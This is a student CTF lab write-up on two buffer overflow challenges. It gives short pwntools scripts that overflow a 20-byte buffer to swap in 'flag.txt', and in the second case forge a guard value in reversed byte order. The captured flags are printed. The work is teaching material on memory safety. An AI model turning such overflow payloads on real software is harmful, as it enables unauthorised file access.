# Week 5: CTF - web

## Goal

> Gain access to a file by taking advantage of a buffer overflow.

### Challenge 1

> After analyzing the source code, we realized that whatever namefile was in the meme_file variable was the file that was going to be opened, read and printed.
> So if we could change the meme_file variable to the file "flag.txt" we would then have access to this file and its contents.
> Since the *scanf* function reads 28 characters into the 20 character buffer then everything beyond the 20th character will be written to the meme_file variable. So we used the following python code to access the flag.txt file :

```python
#!/usr/bin/python3
from pwn import *

r = remote('ctf-fsi.fe.up.pt', 4003)

r.recvuntil(b":")
r.sendline(b"aaaaaaaaaaaaaaaaaaaa" + b"flag.txt") # Send 20 "trash" bytes and then the value of the file we want to open
r.interactive()

```

> The correct flag for challenge 1 was found:

```text
flag{e2b5a6b98ff37b5c85dd8a59bf222caa}
```

### Challenge 2

> This challenge had some minor changes from the first one in order to prevent a buffer overflow . However, this mitigation did not prove to be efficient since it was easily bypassed.
> A variable has been added between the buffer and meme_file to prevent overflow.
> However, if we could replicate what was written in this variable ("0xfefc2223") the program would assume that this variable had not been changed and would therefore open the file.
> Since the variables are written in the stack bottom-up, the bytes of the val variable must be set in the reverse order. Using the following python script we can perform this attack and get the flag:

```python
from pwn import *

r = remote('ctf-fsi.fe.up.pt', 4000)
r.recvuntil(b":")
r.sendline(b"aaaaaaaaaaaaaaaaaaaa" + b"\x23\x22\xfc\xfe" + b"flag.txt")
r.interactive()

```

> The correct flag for challenge 2 was found:

```text
flag{0e68e08552b7bfe81eb7f7201d81d023}
```
